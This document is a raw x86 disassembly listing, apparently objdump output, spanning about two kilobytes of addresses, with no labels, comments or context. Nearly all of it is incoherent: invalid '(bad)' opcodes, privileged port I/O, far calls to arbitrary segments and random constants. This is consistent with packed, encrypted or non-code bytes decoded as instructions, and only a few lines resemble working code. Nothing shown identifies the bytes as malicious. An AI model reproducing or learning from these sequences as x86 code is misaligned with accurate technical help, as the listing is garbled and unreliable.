  4169f7:	ret    0xfff8
  4169fa:	cdq    
  4169fb:	in     eax,dx
  4169fc:	pop    eax
  4169fd:	or     eax,edx
  4169ff:	ja     0x4169a5
  416a01:	int    0xfb
  416a03:	jns    0x4169d9
  416a05:	push   0x22
  416a07:	xchg   esp,eax
  416a08:	daa    
  416a09:	pushf  
  416a0a:	inc    edx
  416a0b:	adc    BYTE PTR ds:[edx+edx*2-0x54],dh
  416a10:	jno    0x4169f3
  416a12:	dec    ebp
  416a13:	clc    
  416a14:	cmp    eax,0x154dc478
  416a19:	leave  
  416a1a:	int    0x5e
  416a1c:	xchg   ebx,eax
  416a1d:	jno    0x416a1e
  416a1f:	mov    BYTE PTR [edi],bl
  416a21:	jbe    0x4169d7
  416a23:	leave  
  416a24:	out    0x55,eax
  416a26:	mov    ds:0xb9b4e510,eax
  416a2b:	(bad)
  416a2e:	mov    eax,0x3a40cdb8
  416a33:	lods   eax,DWORD PTR ds:[esi]
  416a34:	outs   dx,BYTE PTR ds:[esi]
  416a35:	jp     0x416a82
  416a37:	jg     0x416a19
  416a39:	sbb    eax,0x9cc9cf09
  416a3e:	push   ebx
  416a3f:	daa    
  416a40:	adc    al,0x2b
  416a42:	bound  ebx,QWORD PTR [edx+0x6d9c6166]
  416a48:	sub    al,0xed
  416a4a:	(bad)
  416a4e:	ss xchg esp,eax
  416a50:	loop   0x416a50
  416a52:	xor    eax,DWORD PTR [edx+0x8]
  416a55:	adc    BYTE PTR [esi-0x22991156],ch
  416a5b:	cwde   
  416a5c:	jge    0x416a28
  416a5e:	sub    DWORD PTR [ecx+edi*1-0x315a9234],esp
  416a65:	pop    eax
  416a66:	mov    ebp,DWORD PTR [eax]
  416a68:	xor    bh,BYTE PTR [edx]
  416a6a:	pop    ebx
  416a6b:	sbb    bl,al
  416a6d:	ja     0x416ae0
  416a6f:	xchg   DWORD PTR ds:0x466de91e,edi
  416a75:	loopne 0x416a17
  416a77:	(bad)  
  416a79:	mov    al,0x2d
  416a7b:	mov    eax,0xc738482a
  416a80:	popa   
  416a81:	inc    edx
  416a82:	jl     0x416ad0
  416a84:	sub    eax,0x47e33969
  416a89:	dec    ebx
  416a8a:	loopne 0x416ab3
  416a8c:	mov    bh,0x10
  416a8e:	imul   eax,DWORD PTR [eax+0xe5f982b],0x2e
  416a95:	mov    bl,0x3
  416a97:	gs ins BYTE PTR es:[edi],dx
  416a99:	add    al,BYTE PTR [ebp-0x39]
  416a9c:	mov    al,0x72
  416a9e:	or     ebp,ebx
  416aa0:	jns    0x416a38
  416aa2:	lahf   
  416aa3:	and    ebp,DWORD PTR [edi-0x1b]
  416aa6:	enter  0x37ff,0x46
  416aaa:	push   ebx
  416aab:	ds add ax,0x7873
  416ab0:	inc    eax
  416ab1:	push   ds
  416ab2:	call   0x5a82:0x422d8673
  416ab9:	or     DWORD PTR [ebx],0x70
  416abc:	sbb    DWORD PTR [edi+0x5a],ebp
  416abf:	or     eax,0x2eda6876
  416ac4:	xor    edi,ebp
  416ac6:	jnp    0x416b16
  416ac8:	mov    al,0xb9
  416aca:	fild   WORD PTR [edi+0x17]
  416acd:	rol    BYTE PTR [ecx-0x7826bf00],0x84
  416ad4:	push   edi
  416ad5:	stc    
  416ad6:	add    ecx,edx
  416ad8:	pop    edx
  416ad9:	adc    DWORD PTR [esi+0xb],eax
  416adc:	in     eax,dx
  416add:	mov    ebx,0xea39bb13
  416ae2:	or     al,ah
  416ae4:	and    ah,cl
  416ae6:	jge    0x416b5d
  416ae8:	xchg   edx,eax
  416ae9:	loopne 0x416ab9
  416aeb:	lahf   
  416aec:	add    ecx,DWORD PTR [ebx+edx*2+0x65cd0a]
  416af3:	push   esi
  416af4:	push   0x77
  416af6:	xchg   edi,eax
  416af7:	mov    edi,0x75cd86bc
  416afc:	test   BYTE PTR [eax],ah
  416afe:	cmp    ah,cl
  416b00:	lock stos DWORD PTR es:[edi],eax
  416b02:	jle    0x416abc
  416b04:	adc    edx,DWORD PTR [ecx-0x7d]
  416b07:	mov    ebx,0xd967b36
  416b0c:	mov    ah,0x83
  416b0e:	icebp  
  416b0f:	pop    esi
  416b10:	adc    eax,0x1088bfab
  416b15:	test   al,0xd1
  416b17:	inc    edi
  416b18:	or     DWORD PTR [edi-0x4a01c03],eax
  416b1e:	mov    WORD PTR [edx],?
  416b20:	fiadd  DWORD PTR [eax+ecx*1-0x50]
  416b24:	out    0x4a,al
  416b26:	and    eax,0x1f1d9aa8
  416b2b:	mov    esp,0xb94b065b
  416b30:	pop    ecx
  416b31:	cmp    al,0xd2
  416b33:	and    al,0x17
  416b35:	push   ecx
  416b36:	out    dx,eax
  416b37:	add    ecx,ebp
  416b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b3a:	or     edx,ebp
  416b3c:	or     DWORD PTR [edi+0x1a7edb99],esp
  416b42:	cmc    
  416b43:	scas   eax,DWORD PTR es:[edi]
  416b44:	push   eax
  416b45:	cld    
  416b46:	test   al,0x2d
  416b48:	xchg   ebx,eax
  416b49:	(bad)  
  416b4a:	mov    ds:0x26bb5d05,eax
  416b4f:	sbb    ecx,esi
  416b51:	pop    ebx
  416b52:	and    eax,0x805145ab
  416b57:	jns    0x416ae8
  416b59:	push   ebx
  416b5a:	iret   
  416b5b:	dec    ebx
  416b5c:	sbb    edx,DWORD PTR [esi]
  416b5e:	dec    esp
  416b5f:	imul   ebx,ecx,0x55
  416b62:	jge    0x416b57
  416b64:	mov    eax,ds:0xb3f4d9f0
  416b69:	(bad)  [esi-0x2862e646]
  416b6f:	or     edx,DWORD PTR ds:0x374543cd
  416b75:	xor    DWORD PTR [eax],esi
  416b77:	stc    
  416b78:	mov    ah,0x28
  416b7a:	mov    bl,0x43
  416b7c:	cdq    
  416b7d:	addr16 repz pop eax
  416b80:	push   ss
  416b81:	fs retf 0xe8a5
  416b85:	ins    DWORD PTR es:[edi],dx
  416b86:	xchg   ecx,eax
  416b87:	call   0xfa72:0xf7c0fee5
  416b8e:	xor    esp,DWORD PTR [ecx]
  416b90:	hlt    
  416b91:	adc    dh,cl
  416b93:	ret    0x947d
  416b96:	or     cl,dh
  416b98:	sbb    BYTE PTR [edx-0x54],cl
  416b9b:	lahf   
  416b9c:	push   0xffffff85
  416b9e:	aam    0x9f
  416ba0:	inc    ecx
  416ba1:	fld    DWORD PTR [eax-0x7f]
  416ba4:	or     al,0xd0
  416ba6:	dec    ebp
  416ba7:	inc    ebp
  416ba8:	mov    ecx,0x55058920
  416bad:	dec    ecx
  416bae:	add    edx,DWORD PTR [edx+0x618f718]
  416bb4:	push   ecx
  416bb5:	add    eax,DWORD PTR [ecx-0x7b]
  416bb8:	inc    ecx
  416bb9:	mov    ebp,0xec906219
  416bbe:	xchg   ebx,eax
  416bbf:	jnp    0x416bce
  416bc1:	enter  0x8c9b,0x5e
  416bc5:	inc    ecx
  416bc6:	mov    dh,0x67
  416bc8:	mov    ah,BYTE PTR [esp+ebx*8-0x16f80a24]
  416bcf:	inc    ebp
  416bd0:	inc    esi
  416bd1:	adc    edi,edx
  416bd3:	(bad)  
  416bd4:	pushf  
  416bd5:	add    ebx,DWORD PTR [ecx-0x28]
  416bd8:	pop    ebp
  416bd9:	or     DWORD PTR [edi+esi*2],edi
  416bdc:	iret   
  416bdd:	mov    ah,0x59
  416bdf:	enter  0x143c,0x3c
  416be3:	mov    edx,ds
  416be5:	jmp    0x40d11ea6
  416bea:	mov    BYTE PTR [ebp+0x154a254c],0xdd
  416bf1:	xchg   esi,eax
  416bf2:	cmp    al,0x3f
  416bf4:	jg     0x416c64
  416bf6:	add    ebp,ebx
  416bf8:	pushf  
  416bf9:	retf   0x9409
  416bfc:	(bad)  
  416bfd:	lods   eax,DWORD PTR ds:[esi]
  416bfe:	imul   edi,DWORD PTR [edi-0x7e111afb],0x46ef52c3
  416c08:	lahf   
  416c09:	mov    ebx,0xb4ae3cdd
  416c0e:	add    eax,DWORD PTR [esp+ecx*8+0x1bde803d]
  416c15:	push   0x4b
  416c17:	fstp   TBYTE PTR [esi-0x6e]
  416c1a:	cmp    BYTE PTR [edi-0xef5d78c],al
  416c20:	xor    eax,0x8604c87d
  416c25:	int    0x67
  416c27:	mov    ds,WORD PTR [edx]
  416c29:	hlt    
  416c2a:	das    
  416c2b:	arpl   di,si
  416c2d:	cld    
  416c2e:	pop    esi
  416c2f:	mov    al,ds:0x1dde4124
  416c34:	rcl    DWORD PTR [ebx+0xf],0x6a
  416c38:	mov    dl,0xf5
  416c3a:	imul   edi,DWORD PTR [eax],0xffffffa9
  416c3d:	ret    
  416c3e:	xchg   esp,eax
  416c3f:	cmp    bl,al
  416c41:	out    0xd,al
  416c43:	mov    al,0xa2
  416c45:	ss push es
  416c47:	cwde   
  416c48:	test   BYTE PTR [esi-0x7],0xf5
  416c4c:	sub    al,0x38
  416c4e:	bound  ebp,QWORD PTR [edx-0x552a1e68]
  416c54:	cmp    esp,esp
  416c56:	aad    0xbe
  416c58:	das    
  416c59:	xlat   BYTE PTR ds:[ebx]
  416c5a:	int    0xb9
  416c5c:	ins    BYTE PTR es:[edi],dx
  416c5d:	les    esp,FWORD PTR [eax+0x40]
  416c60:	loop   0x416c24
  416c62:	pushf  
  416c63:	jmp    0x5398:0xa29f58e0
  416c6a:	xor    DWORD PTR [edx+0x46a9ca87],0xffffffb5
  416c71:	repz mov cl,0x74
  416c74:	dec    edx
  416c75:	mov    edx,0x769d95e4
  416c7a:	sub    dh,BYTE PTR [esi+0x48]
  416c7d:	cmp    ebx,DWORD PTR [eax+0x40700602]
  416c83:	xor    al,0x7f
  416c85:	or     esp,eax
  416c87:	popf   
  416c88:	xor    al,BYTE PTR [ecx*4-0x452f01b6]
  416c8f:	jmp    0x4d01:0x2821dd8
  416c96:	pop    es
  416c97:	jne    0x416cfc
  416c99:	push   es
  416c9a:	outs   dx,DWORD PTR ds:[esi]
  416c9b:	and    dh,ch
  416c9d:	cmc    
  416c9e:	push   es
  416c9f:	ret    
  416ca0:	sbb    eax,DWORD PTR [edx+0x193d23c4]
  416ca6:	imul   eax,DWORD PTR [edi],0x6d
  416ca9:	mul    BYTE PTR [edi+edi*4-0x51]
  416cad:	inc    edx
  416cae:	or     esp,DWORD PTR [edi+0x65]
  416cb1:	test   eax,0xfe57c55
  416cb6:	xchg   esp,eax
  416cb7:	xchg   al,ch
  416cb9:	enter  0xc58e,0x1c
  416cbd:	fwait
  416cbe:	pop    esp
  416cbf:	dec    ecx
  416cc0:	pop    esp
  416cc1:	das    
  416cc2:	push   edi
  416cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cc4:	imul   edx,esp,0x49
  416cc7:	xor    al,BYTE PTR [esi]
  416cc9:	push   esp
  416cca:	xor    DWORD PTR [eax],esp
  416ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ccd:	cmp    eax,0xb4eb38e9
  416cd2:	sahf   
  416cd3:	pop    eax
  416cd4:	std    
  416cd5:	test   al,0x40
  416cd7:	pop    es
  416cd8:	loope  0x416ce4
  416cda:	out    0x3,eax
  416cdc:	pop    edi
  416cdd:	mov    al,ds:0x53fc4d96
  416ce2:	scas   eax,DWORD PTR es:[edi]
  416ce3:	adc    DWORD PTR [edi-0x5843c01a],ebp
  416ce9:	das    
  416cea:	xchg   ebx,eax
  416ceb:	mov    ebx,0xec918ae7
  416cf0:	xchg   ebx,eax
  416cf1:	mov    al,ds:0xec6f89c3
  416cf6:	addr16 faddp st(0),st
  416cf9:	fwait
  416cfa:	pop    esp
  416cfb:	pop    ebx
  416cfc:	xchg   ebx,eax
  416cfd:	sub    al,0x85
  416cff:	(bad)  
  416d00:	pop    ss
  416d01:	add    edx,DWORD PTR [esi+0x10e5ead6]
  416d07:	aas    
  416d08:	loope  0x416d42
  416d0a:	lods   eax,DWORD PTR ds:[esi]
  416d0b:	aaa    
  416d0c:	mov    ebx,0x937466ea
  416d11:	xchg   ebp,eax
  416d12:	data16 sti 
  416d14:	or     bh,BYTE PTR [esi]
  416d16:	cmp    BYTE PTR [ebx],0xf1
  416d19:	push   ss
  416d1a:	push   edi
  416d1b:	arpl   WORD PTR [esi-0xaa0e90f],bx
  416d21:	push   0x4c3f020e
  416d26:	jmp    0x9bf61fcf
  416d2b:	aas    
  416d2c:	inc    edi
  416d2d:	mov    ebx,edx
  416d2f:	mov    ebp,0x7ca49703
  416d34:	push   es
  416d35:	push   ecx
  416d36:	pop    es
  416d37:	push   ss
  416d38:	xchg   ebx,eax
  416d39:	pusha  
  416d3a:	fldenv ds:[ebp-0x616c352e]
  416d41:	jmp    0x42e1:0xb7abb44b
  416d48:	cwde   
  416d49:	fidiv  DWORD PTR [eax]
  416d4b:	or     DWORD PTR [ecx-0x58],ebx
  416d4e:	test   BYTE PTR [eax],bh
  416d50:	or     cl,0x5c
  416d53:	mov    cl,0x5
  416d55:	outs   dx,DWORD PTR ds:[esi]
  416d56:	and    DWORD PTR [ebp+0xb],ebx
  416d59:	cdq    
  416d5a:	lods   eax,DWORD PTR ds:[esi]
  416d5b:	xor    eax,0x457c3fef
  416d60:	xor    eax,DWORD PTR [ecx]
  416d62:	daa    
  416d63:	jl     0x416dd7
  416d65:	or     dh,ah
  416d67:	push   ecx
  416d68:	sahf   
  416d69:	inc    eax
  416d6a:	adc    DWORD PTR [edx],ecx
  416d6c:	test   eax,0xe0a6fba4
  416d71:	outs   dx,BYTE PTR ds:[esi]
  416d72:	push   edi
  416d73:	mov    eax,0xf920f0ef
  416d78:	xchg   edx,eax
  416d79:	in     eax,0x73
  416d7b:	fldcw  WORD PTR [ecx]
  416d7d:	mov    bl,0xb9
  416d7f:	lock mov BYTE PTR [esi-0x37b80c34],ch
  416d86:	xor    BYTE PTR [ebx+0x56],ch
  416d89:	out    0xa6,al
  416d8b:	inc    eax
  416d8c:	je     0x416d23
  416d8e:	fsubr  QWORD PTR [ecx+0x21]
  416d91:	and    eax,0xd9f4ef61
  416d96:	inc    edx
  416d97:	out    dx,eax
  416d98:	rol    BYTE PTR [edx+0x1d],cl
  416d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d9c:	fsubr  DWORD PTR [eax-0x41]
  416d9f:	push   edx
  416da0:	mov    eax,ds:0xd3382c7
  416da5:	ret    
  416da6:	mov    ecx,DWORD PTR [esp+eiz*8+0x30eeeccf]
  416dad:	xor    al,0x87
  416daf:	ins    BYTE PTR es:[edi],dx
  416db0:	enter  0x5a61,0xb
  416db4:	xor    eax,ebx
  416db6:	in     al,0x95
  416db8:	ss out dx,al
  416dba:	mov    edi,0x388da5b7
  416dbf:	xchg   edi,eax
  416dc0:	mov    ebp,0x6a788cce
  416dc5:	and    BYTE PTR ds:0xf0c1fbda,0x5c
  416dcc:	leave  
  416dcd:	cmp    al,0x1e
  416dcf:	into   
  416dd0:	out    0x32,al
  416dd2:	jg     0x416dae
  416dd4:	sbb    dl,BYTE PTR [eax+0x66]
  416dd7:	pop    ecx
  416dd8:	jo     0x416e06
  416dda:	daa    
  416ddb:	icebp  
  416ddc:	dec    ebp
  416ddd:	adc    dl,BYTE PTR [edx]
  416ddf:	in     al,0x2d
  416de1:	push   es
  416de2:	adc    BYTE PTR [esi+edx*1-0x23],0xc7
  416de7:	test   al,0x13
  416de9:	xor    DWORD PTR [edx-0x28],eax
  416dec:	pop    edx
  416ded:	pop    ebp
  416dee:	and    DWORD PTR ss:[ebx+0x4a],edx
  416df2:	jno    0x416e30
  416df4:	ds (bad) 
  416df6:	or     ebx,DWORD PTR [ebx-0x33e959d7]
  416dfc:	cwde   
  416dfd:	loope  0x416dc2
  416dff:	sub    esi,ecx
  416e01:	aaa    
  416e02:	imul   edi,DWORD PTR [eax+0x6c],0x7f71672
  416e09:	out    0x40,al
  416e0b:	adc    DWORD PTR [eax-0x18c089cd],ebp
  416e11:	imul   esi,edx,0x1100fa3
  416e17:	arpl   ax,sp
  416e19:	leave  
  416e1a:	cwde   
  416e1b:	sub    al,ah
  416e1d:	push   es
  416e1e:	cmp    eax,0xf8a961bc
  416e23:	stc    
  416e24:	inc    ebp
  416e25:	dec    ebx
  416e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e27:	ret    
  416e28:	adc    eax,DWORD PTR [edi+0x643326c]
  416e2e:	rol    DWORD PTR [ecx+0x1e],0xd7
  416e32:	cmp    al,0xe
  416e34:	xor    esi,DWORD PTR [esi]
  416e36:	iret   
  416e37:	fs cs cmc 
  416e3a:	call   0x52d04496
  416e3f:	pop    edi
  416e40:	test   BYTE PTR [edi-0x5140489d],dh
  416e46:	iret   
  416e47:	iret   
  416e48:	sub    al,0x19
  416e4a:	out    0xee,al
  416e4c:	mov    esi,0x8f77ca1b
  416e51:	sbb    ebp,DWORD PTR [eax-0x37]
  416e54:	scas   eax,DWORD PTR es:[edi]
  416e55:	dec    edi
  416e56:	cli    
  416e57:	pop    ebx
  416e58:	inc    ebp
  416e59:	inc    esi
  416e5a:	inc    ebx
  416e5b:	dec    esi
  416e5c:	rcr    BYTE PTR [edi-0x34],0xdf
  416e60:	xchg   edi,eax
  416e61:	jl     0x416e5c
  416e63:	cmp    eax,0x3a987528
  416e68:	cmp    al,BYTE PTR [eax+0x1ab02d35]
  416e6e:	inc    ecx
  416e6f:	inc    ebp
  416e70:	cmp    BYTE PTR [ebp+0x412a6f1d],bl
  416e76:	cmp    al,0x52
  416e78:	sub    eax,0x15b7d8c4
  416e7d:	(bad)  
  416e7e:	out    dx,al
  416e7f:	mov    ebp,0xaad7e8cd
  416e84:	xor    esi,eax
  416e86:	cli    
  416e87:	pop    ebx
  416e88:	push   ebx
  416e89:	dec    ebx
  416e8a:	(bad)  
  416e8b:	jle    0x416ede
  416e8d:	nop
  416e8e:	leave  
  416e8f:	test   eax,0x89b1ab16
  416e94:	fimul  DWORD PTR [edi+ebx*4+0x179e9078]
  416e9b:	and    eax,0xdc11713e
  416ea0:	call   0x792cf351
  416ea5:	out    0xd4,eax
  416ea7:	mov    eax,ds:0xc2220cfa
  416eac:	aas    
  416ead:	push   0xffffffe2
  416eaf:	xor    eax,0xba699573
  416eb4:	xor    ecx,edx
  416eb6:	shrd   eax,ecx,0x2
  416eba:	or     eax,DWORD PTR [ebp+0x10]
  416ebd:	shr    ecx,0x2
  416ec0:	mov    DWORD PTR [ebp+0x8],eax
  416ec3:	mov    eax,ecx
  416ec5:	or     eax,DWORD PTR [ebp+0x14]
  416ec8:	mov    ecx,DWORD PTR [ebx]
  416eca:	mov    edx,DWORD PTR [ebx+0x4]
  416ecd:	push   eax
  416ece:	push   DWORD PTR [ebp+0x8]
  416ed1:	jmp    0x41745b
  416ed6:	aaa    
  416ed7:	or     bl,BYTE PTR [ebp+0x2e982194]
  416edd:	js     0x416f43
  416edf:	stc    
  416ee0:	sub    al,0xb4
  416ee2:	shl    bl,0xef
  416ee5:	push   0x160c99b1
  416eea:	cmp    eax,0xab161604
  416eef:	mov    fs,WORD PTR [edx-0x1ac1ddec]
  416ef5:	pop    esp
  416ef6:	sbb    BYTE PTR [edi-0x80],cl
  416ef9:	push   cs
  416efa:	js     0x416e8e
  416efc:	mov    esi,0x55b3447f
  416f01:	les    edi,FWORD PTR [ebx+eiz*1-0x25e8dc9e]
  416f08:	enter  0xd9a4,0x6b
  416f0c:	mov    WORD PTR [ebp-0x425e069],cx
  416f13:	mov    eax,0x5540849e
  416f18:	icebp  
  416f19:	and    al,ch
  416f1b:	fcomp  st(0)
  416f1d:	imul   ebx,DWORD PTR ds:[edx-0x5388aaad],0x65
  416f25:	jnp    0x416eae
  416f27:	mov    edx,0x8f06a5e2
  416f2c:	sbb    BYTE PTR ds:[edi+0x7e14e7f6],dh
  416f33:	add    DWORD PTR [eax-0x18],eax
  416f36:	push   0x12e32450
  416f3b:	into   
  416f3c:	dec    ebp
  416f3d:	inc    eax
  416f3e:	fnstsw WORD PTR [eax+edx*4-0x59]
  416f42:	jmp    0x416fb7
  416f44:	(bad)  
  416f45:	pop    ds
  416f46:	lea    edx,[esi]
  416f48:	add    al,0xa0
  416f4a:	imul   esp,eax,0xa8050937
  416f50:	sbb    eax,0xebba070d
  416f55:	mov    WORD PTR [ebx+0x4860b5f0],es
  416f5b:	dec    esi
  416f5c:	xor    al,0xe8
  416f5e:	and    al,0xc8
  416f60:	mov    dh,0x8b
  416f62:	cli    
  416f63:	shr    DWORD PTR [eax+eiz*1],1
  416f66:	sub    BYTE PTR [esi+0x60502473],bh
  416f6c:	popf   
  416f6d:	pop    ebx
  416f6e:	ficomp DWORD PTR [edi]
  416f70:	cmp    al,0x2b
  416f72:	mov    esp,0xee078181
  416f77:	push   0x950069bd
  416f7c:	push   ecx
  416f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f7e:	xchg   esi,eax
  416f7f:	pop    bx
  416f81:	loopne 0x416f34
  416f83:	pop    esp
  416f84:	pusha  
  416f85:	pop    ds
  416f86:	int3   
  416f87:	or     DWORD PTR [ebx+0x13],0xffffffc7
  416f8b:	cmp    eax,0xe0192bca
  416f90:	out    dx,al
  416f91:	arpl   WORD PTR [ebp+esi*8+0x5d],bx
  416f95:	loope  0x416fc2
  416f97:	inc    edx
  416f98:	aad    0x76
  416f9a:	push   ebp
  416f9b:	add    al,0x2
  416f9d:	out    0x51,eax
  416f9f:	call   0xdda7:0x1f065618
  416fa6:	and    dl,al
  416fa8:	(bad)  
  416fa9:	cmp    edx,DWORD PTR [esi-0x4689fd0b]
  416faf:	push   ebp
  416fb0:	mov    esi,0x9e830e1f
  416fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fb6:	sub    DWORD PTR [ecx+0x6a5006e5],edi
  416fbc:	imul   ebp,ecx,0x26a2a2db
  416fc2:	les    esp,FWORD PTR [edx-0x7e99cd0e]
  416fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc9:	push   ds
  416fca:	dec    edi
  416fcb:	push   ebp
  416fcc:	cmp    esp,DWORD PTR [ecx]
  416fce:	xchg   ebp,eax
  416fcf:	xor    al,0xe3
  416fd1:	mov    dl,0x28
  416fd3:	pop    ecx
  416fd4:	stos   DWORD PTR es:[edi],eax
  416fd5:	or     ecx,DWORD PTR [ecx+ebp*1+0x7c]
  416fd9:	scas   al,BYTE PTR es:[edi]
  416fda:	outs   dx,BYTE PTR ds:[esi]
  416fdb:	and    bl,ch
  416fdd:	mov    ecx,0xca4b0cd0
  416fe2:	adc    ebx,DWORD PTR [eax+ecx*4]
  416fe5:	stos   DWORD PTR es:[edi],eax
  416fe6:	in     eax,0x3e
  416fe8:	pop    esp
  416fe9:	xchg   DWORD PTR [edx+0x2d1b0cbb],ecx
  416fef:	xchg   ah,ah
  416ff1:	mov    dl,0xcc
  416ff3:	inc    esi
  416ff4:	(bad)  
  416ff7:	mov    ds:0xb02e73d8,eax
  416ffc:	outs   dx,BYTE PTR ds:[esi]
  416ffd:	cmp    DWORD PTR [ecx+ecx*8-0x26],ecx
  417001:	lahf   
  417002:	mov    BYTE PTR [ebx+eiz*2+0x9],bl
  417006:	and    DWORD PTR [ebx+0x3012f80e],edi
  41700c:	pop    edi
  41700d:	repz stc 
  41700f:	(bad)  
  417010:	sbb    al,dh
  417012:	cmp    ecx,DWORD PTR [ecx]
  417014:	mov    dh,0xb8
  417016:	sbb    eax,0x255e8045
  41701b:	push   ebp
  41701c:	push   ds
  41701d:	fimul  WORD PTR [ebp+0x73]
  417020:	jg     0x417016
  417022:	lods   al,BYTE PTR ds:[esi]
  417023:	add    esi,0x7d
  417026:	mov    WORD PTR [eax+ecx*2-0x16],?
  41702a:	cdq    
  41702b:	mov    ecx,DWORD PTR [ecx+0x1a]
  41702e:	clc    
  41702f:	sub    dh,BYTE PTR [edi+0x3d366811]
  417035:	aaa    
  417036:	inc    ecx
  417037:	lods   al,BYTE PTR ds:[esi]
  417038:	shl    BYTE PTR fs:[edi+ecx*4-0x120f14b6],cl
  417040:	dec    esp
  417041:	xor    al,dh
  417043:	dec    edi
  417044:	leave  
  417045:	out    dx,al
  417046:	fxch   st(1)
  417048:	popf   
  417049:	clc    
  41704a:	xor    BYTE PTR [ebp+eax*2+0x76a647c3],bh
  417051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417052:	das    
  417053:	fs repnz in al,dx
  417056:	xor    al,0xf9
  417058:	cdq    
  417059:	sahf   
  41705a:	es ret 0xaa7f
  41705e:	fcmovu st,st(2)
  417060:	jb     0x4170a0
  417062:	div    bl
  417064:	test   BYTE PTR [eax-0x614b6729],bh
  41706a:	sub    ebp,DWORD PTR [ecx-0xe]
  41706d:	inc    edi
  41706e:	dec    edx
  41706f:	jl     0x417062
  417071:	call   0x963e:0xd7203670
  417078:	(bad)  
  417079:	daa    
  41707a:	lods   eax,DWORD PTR ds:[esi]
  41707b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41707c:	ss push esp
  41707e:	dec    edx
  41707f:	sti    
  417080:	mov    BYTE PTR [eax+0x4d],0x65
  417084:	jecxz  0x41706b
  417086:	ret    
  417087:	and    eax,0xbf20cf19
  41708c:	ret    0x511e
  41708f:	imul   edi,DWORD PTR gs:[esi+ebp*4],0x5e45eb6e
  417097:	xor    cl,BYTE PTR [eax]
  417099:	or     eax,0xdfb8faf3
  41709e:	or     al,0x65
  4170a0:	daa    
  4170a1:	cmc    
  4170a2:	push   ebx
  4170a3:	inc    ebp
  4170a4:	call   0x970d:0x16c0fc39
  4170ab:	add    ebp,DWORD PTR [eax]
  4170ad:	add    ecx,ebx
  4170af:	inc    edi
  4170b0:	or     BYTE PTR [eax],cl
  4170b2:	xor    DWORD PTR [esi-0x54f1fdb3],esp
  4170b8:	dec    eax
  4170b9:	data16 cmc 
  4170bb:	call   0x1089c097
  4170c0:	imul   esi,DWORD PTR [edx+0x41463944],0xc8199325
  4170ca:	mov    dl,0xde
  4170cc:	and    DWORD PTR [ecx+0x3dcb250b],ebp
  4170d2:	pushf  
  4170d3:	pop    ds
  4170d4:	jnp    0x41713a
  4170d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d7:	add    eax,0x9356b5e9
  4170dc:	add    ebp,ecx
  4170de:	dec    edx
  4170df:	pop    es
  4170e0:	add    eax,0xec339ec2
  4170e5:	cld    
  4170e6:	adc    ch,BYTE PTR [edx]
  4170e8:	and    al,0x61
  4170ea:	fistp  DWORD PTR [ecx]
  4170ec:	dec    edx
  4170ed:	or     eax,DWORD PTR [ebx+0xdcb3b57]
  4170f3:	lea    eax,[esi+0x1228a813]
  4170f9:	xor    al,0x8a
  4170fb:	test   DWORD PTR [eax],0x2b22ca5b
  417101:	pop    edi
  417102:	lock or cl,al
  417105:	ds push ds
  417107:	jae    0x4170a2
  417109:	xchg   esi,eax
  41710a:	out    dx,al
  41710b:	sbb    al,0xee
  41710d:	adc    DWORD PTR [edi+0x351ce4ee],esi
  417113:	ror    BYTE PTR [esi-0xadb06fa],1
  417119:	fild   WORD PTR [ecx]
  41711b:	js     0x417157
  41711d:	adc    BYTE PTR [edx-0x1c392f2e],al
  417123:	inc    ebp
  417124:	pop    ebx
  417125:	add    eax,0x3ba50f00
  41712a:	pop    ss
  41712b:	lds    eax,FWORD PTR [eax+0xf]
  41712e:	dec    ebx
  41712f:	pop    ebp
  417130:	in     eax,0x32
  417132:	clc    
  417133:	pop    ss
  417134:	popf   
  417135:	mov    ch,0xda
  417137:	cli    
  417138:	jno    0x41716a
  41713a:	ja     0x4170e7
  41713c:	es sti 
  41713e:	outs   dx,BYTE PTR ds:[esi]
  41713f:	push   esp
  417140:	scas   eax,DWORD PTR es:[edi]
  417141:	ror    BYTE PTR [edx+eax*8],0x58
  417145:	xchg   esi,eax
  417146:	ja     0x4171b9
  417148:	xchg   DWORD PTR [edx-0x68],ecx
  41714b:	mov    BYTE PTR ds:0xcaf7e735,0xd6
  417152:	iret   
  417153:	inc    ecx
  417154:	stos   BYTE PTR es:[edi],al
  417155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417156:	pop    ss
  417157:	add    BYTE PTR [ecx-0x60],bh
  41715a:	mov    al,ds:0xef345053
  41715f:	ret    
  417160:	jmp    0x97af7c83
  417165:	and    eax,0x6bd6f3eb
  41716a:	fldz   
  41716c:	and    al,0x8f
  41716e:	mov    edi,0x4d7e1f0b
  417173:	retf   0x22c4
  417176:	les    eax,FWORD PTR [esi-0x4a]
  417179:	jo     0x4171fa
  41717b:	xchg   edx,eax
  41717c:	push   esp
  41717d:	imul   ebx,DWORD PTR [ebp+0x31],0x1db7bb78
  417184:	mov    bh,0x73
  417186:	mov    esi,0x15ab2784
  41718b:	add    ebp,DWORD PTR [ebp+0x766d342f]
  417191:	sub    eax,0x5499d2b
  417196:	ret    
  417197:	jb     0x41719b
  417199:	in     eax,0x6
  41719b:	loop   0x4171d3
  41719d:	nop
  41719e:	jl     0x4171e6
  4171a0:	stos   BYTE PTR es:[edi],al
  4171a1:	cdq    
  4171a2:	outs   dx,BYTE PTR ds:[esi]
  4171a3:	mov    ds:0x488d988f,al
  4171a8:	addr16 jb 0x4171e4
  4171ab:	push   0x74bee772
  4171b0:	cli    
  4171b1:	sub    BYTE PTR [ecx+0x2f23508c],0x72
  4171b8:	stos   DWORD PTR es:[edi],eax
  4171b9:	pop    edi
  4171ba:	cmp    eax,0x95b40c73
  4171bf:	lock leave 
  4171c1:	test   DWORD PTR [ebx],esi
  4171c3:	push   es
  4171c4:	or     BYTE PTR [edi-0x5a],al
  4171c7:	ss ins DWORD PTR es:[edi],dx
  4171c9:	js     0x417187
  4171cb:	sar    DWORD PTR [ebp-0x6d9b3bf2],0xbf
  4171d2:	out    dx,eax
